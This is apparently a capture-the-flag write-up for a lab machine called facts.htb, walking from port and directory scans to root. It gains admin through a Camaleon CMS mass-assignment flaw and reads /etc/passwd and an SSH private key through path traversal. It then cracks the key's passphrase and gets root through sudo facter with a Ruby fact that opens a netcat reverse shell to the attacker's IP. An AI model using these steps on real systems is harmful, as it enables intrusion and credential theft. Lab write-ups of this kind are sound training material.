# initial nmap scan 
```
nmap -p- -sV -sC -T4 --min-rate=5000 -oN nmap.txt 10.129.25.59 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-01 09:53 -0500
Warning: 10.129.25.59 giving up on port because retransmission cap hit (6).
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 09:55 (0:00:12 remaining)
Nmap scan report for 10.129.25.59
Host is up (0.097s latency).
Not shown: 60964 closed tcp ports (reset), 4568 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
54321/tcp open  http    Golang net/http server
|_http-title: Did not follow redirect to http://10.129.25.59:9001
|_http-server-header: MinIO
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 189027284FE025EA
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 01 Feb 2026 14:55:07 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>189027284FE025EA</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18902724763BA616
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 01 Feb 2026 14:54:51 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>18902724763BA616</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Sun, 01 Feb 2026 14:54:51 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.98%I=7%D=2/1%Time=697F6939%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nAcc
SF:ept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20appl
SF:ication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max-ag
SF:e=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x20d
SF:d9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX-Am
SF:z-Request-Id:\x2018902724763BA616\r\nX-Content-Type-Options:\x20nosniff
SF:\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Sun,\x2001\x20Feb
SF:\x202026\x2014:54:51\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20encodi
SF:ng=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\x20
SF:Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><Requ
SF:estId>18902724763BA616</RequestId><HostId>dd9025bab4ad464b049177c95eb6e
SF:bf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions,59
SF:,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Sun,\x2001\x20F
SF:eb\x202026\x2014:54:51\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPR
SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1\.0\x20
SF:400\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20
SF:303\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nStrict-T
SF:ransport-Security:\x20max-age=31536000;\x20includeSubDomains\r\nVary:\x
SF:20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9
SF:251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x20189027284FE025EA\r\nX-Cont
SF:ent-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=block\r
SF:\nDate:\x20Sun,\x2001\x20Feb\x202026\x2014:55:07\x20GMT\r\n\r\n<\?xml\x
SF:20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>InvalidReques
SF:t</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</Message
SF:><Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestId>18902
SF:7284FE025EA</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd
SF:1af9251148b658df7ac2e3e8</HostId></Error>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.40 seconds
```

port 22,80 and 54321 
theres a golang server on 54321 

port 80 
<img src="assets/Pasted image 20260201155743.png">fuzzing the dirs 
```
ffuf -u http://facts.htb/FUZZ  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt    
________________________________________________

index.php               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 148ms]
search.php              [Status: 200, Size: 19207, Words: 3276, Lines: 272, Duration: 237ms]
admin.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 228ms]
ajax.php                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 196ms]
rss.php                 [Status: 200, Size: 183, Words: 20, Lines: 9, Duration: 227ms]
index.html              [Status: 200, Size: 11128, Words: 1328, Lines: 125, Duration: 245ms]
404.html                [Status: 200, Size: 4836, Words: 832, Lines: 115, Duration: 185ms]
search.html             [Status: 200, Size: 19212, Words: 3276, Lines: 272, Duration: 262ms]
search.aspx             [Status: 200, Size: 19212, Words: 3276, Lines: 272, Duration: 287ms]
post.php                [Status: 200, Size: 11320, Words: 1414, Lines: 152, Duration: 326ms]
captcha.php             [Status: 200, Size: 6088, Words: 31, Lines: 24, Duration: 432ms]
.htaccess               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 396ms]
index.htm               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 373ms]
search.asp              [Status: 200, Size: 19207, Words: 3276, Lines: 272, Duration: 332ms]
index.asp               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 282ms]
error.html              [Status: 500, Size: 7918, Words: 1035, Lines: 115, Duration: 274ms]
rss.xml                 [Status: 200, Size: 183, Words: 20, Lines: 9, Duration: 252ms]
index.cfm               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 289ms]
robots.txt              [Status: 200, Size: 99, Words: 12, Lines: 2, Duration: 322ms]
sitemap.xml             [Status: 200, Size: 3508, Words: 424, Lines: 130, Duration: 336ms]
sitemap.php             [Status: 200, Size: 2090, Words: 593, Lines: 33, Duration: 217ms]

```
doesnt seem to have something clear ,also subdomain enum didnt reveal nothing 
```
gobuster vhost -u http://facts.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain   
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 4989 / 4989 (100.00%)
===============================================================
Finished
===============================================================
```

altho nikto revealed these endpoints 
<img src="assets/Pasted image 20260201160447.png">/admin.cgi 

visiting the link resirected us to ``/admin/login`` , i tried `/admin/register` and it returned registration form, gave idea to fuzz the `admin` endpoint 

```
ffuf -u http://facts.htb/admin/FUZZ  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt  -fc 302 

________________________________________________

login.php               [Status: 200, Size: 3908, Words: 669, Lines: 85, Duration: 58ms]
register.php            [Status: 200, Size: 4900, Words: 835, Lines: 101, Duration: 187ms]
login.html              [Status: 200, Size: 3911, Words: 669, Lines: 85, Duration: 224ms]
login.aspx              [Status: 200, Size: 3911, Words: 669, Lines: 85, Duration: 208ms]
login.asp               [Status: 200, Size: 3908, Words: 669, Lines: 85, Duration: 181ms]
register.aspx           [Status: 200, Size: 4903, Words: 835, Lines: 101, Duration: 214ms]
register.html           [Status: 200, Size: 4903, Words: 835, Lines: 101, Duration: 177ms]
register.asp            [Status: 200, Size: 4900, Words: 835, Lines: 101, Duration: 172ms]
login.cfm               [Status: 200, Size: 3908, Words: 669, Lines: 85, Duration: 183ms]
forgot.php              [Status: 200, Size: 3050, Words: 346, Lines: 63, Duration: 214ms]
login.htm               [Status: 200, Size: 3908, Words: 669, Lines: 85, Duration: 195ms]
login.jsp               [Status: 200, Size: 3908, Words: 669, Lines: 85, Duration: 181ms]
register.htm            [Status: 200, Size: 4900, Words: 835, Lines: 101, Duration: 298ms]
login.cgi               [Status: 200, Size: 3908, Words: 669, Lines: 85, Duration: 499ms]
register.cfm            [Status: 200, Size: 4900, Words: 835, Lines: 101, Duration: 442ms]
register.jsp            [Status: 200, Size: 4900, Words: 835, Lines: 101, Duration: 502ms]
forgot.html             [Status: 200, Size: 3053, Words: 346, Lines: 63, Duration: 446ms]
forgot.asp              [Status: 200, Size: 3050, Words: 346, Lines: 63, Duration: 451ms]
register.cgi            [Status: 200, Size: 4900, Words: 835, Lines: 101, Duration: 435ms]
login.phtml             [Status: 200, Size: 3914, Words: 669, Lines: 85, Duration: 419ms]
login.shtml             [Status: 200, Size: 3914, Words: 669, Lines: 85, Duration: 423ms]
login.action            [Status: 200, Size: 3917, Words: 669, Lines: 85, Duration: 347ms]
login.php3              [Status: 200, Size: 3911, Words: 669, Lines: 85, Duration: 609ms]
register.shtml          [Status: 200, Size: 4906, Words: 835, Lines: 101, Duration: 482ms]
login.jhtml             [Status: 200, Size: 3914, Words: 669, Lines: 85, Duration: 404ms]
```

nothing much .. so we back to register 
<img src="assets/Pasted image 20260201161033.png">
and we are admin ?? that ez ?, ok we go on 
<img src="assets/Pasted image 20260201161114.png">
camaleon CMS 2.9.0 
the cms is vunrable to Mass Assignment vurnability . `[CVE-2025-2304](https://www.tenable.com/cve/CVE-2025-2304)`

```java
def updated_ajax
  @user = current_site.users.find(params[:user_id])
  update_session = current_user_is?(@user)

  @user.update(params.require(:password).permit!)
  render inline: @user.errors.full_messages.join(', ')

  # keep user logged in when changing their own password
  update_auth_token_in_cookie @user.auth_token if update_session && @user.saved_change_to_password_digest?
end
```

The vulnerability stems from the use of the dangerous permit! method, which allows all parameters to pass through without any filtering.

An attacker can exploit this vulnerability by submitting a request with an extra parameter that includes the role attribute allowing a user with limited privileges to become an administrator.

we open up burpsuite and get the request from there on changing our passwords 

<img src="assets/Pasted image 20260201170949.png">
profile 
<img src="assets/Pasted image 20260201171010.png">

change password 

<img src="assets/Pasted image 20260201171024.png">

on burpsuite <img src="assets/Pasted image 20260201171057.png">
this is not enough we need to get the new auth_token from browser and replace it with a newer password and the `role=admin`
<img src="assets/Pasted image 20260201171205.png">
and we are administrator 
<img src="assets/Pasted image 20260201171455.png">

searching more on the camaleon cms we found this https://sca.analysiscenter.veracode.com/vulnerability-database/security/1/1/sid-48904/summary

<img src="assets/Pasted image 20260201174018.png">

luckly we are using 2.9.0 

reading more we found a path that we can download private file 
`http://facts.htb/admin/media/download_private_file?file=../../../home/../../../etc/passwd 
we got two user 

```
cat passwd | grep bash 
root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

checking william `.ssh` folder we found nothing altho trivia has the `authorized_keys` file so it must be there sitting an `id_rsa` or `id_ed25519`

`http://facts.htb/admin/media/download_private_file?file=../../../home/../../../home/trivia/.ssh/id_ed25519`

and we got a key .. trying to ssh with that getting us a password to authenticate 

```
┌──(kali㉿kali)-[~/repo/season10/facts]
└─$ chmod 600 id_ed25519 

┌──(kali㉿kali)-[~/repo/season10/facts]
└─$ ssh -i id_ed25519 trivia@facts.htb 
Enter passphrase for key 'id_ed25519': 
```

we crack it with ``ssh2john`` and we found it 

<img src="assets/Pasted image 20260201181112.png">
we are in 
<img src="assets/Pasted image 20260201181144.png">

# priv escalation 

```
sudo -l 
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter

```

facter has a PATH manipulation vurnability , can use that to get root 

we create a local dircotry `facts` and inside that a `ruby` script that can give us a reversehll 

```ruby 
Facter.add(:root) do
  setcode do
    system("busybox nc 10.10.16.96 4444 -e sh")
    "done"
  end
end
```
setting up a listener 
```
nc -lvnp 4444 
```
and we execute the script 
```bash 
sudo /usr/bin/facter --custom-dir /home/trivia/facts
```

and we have root 
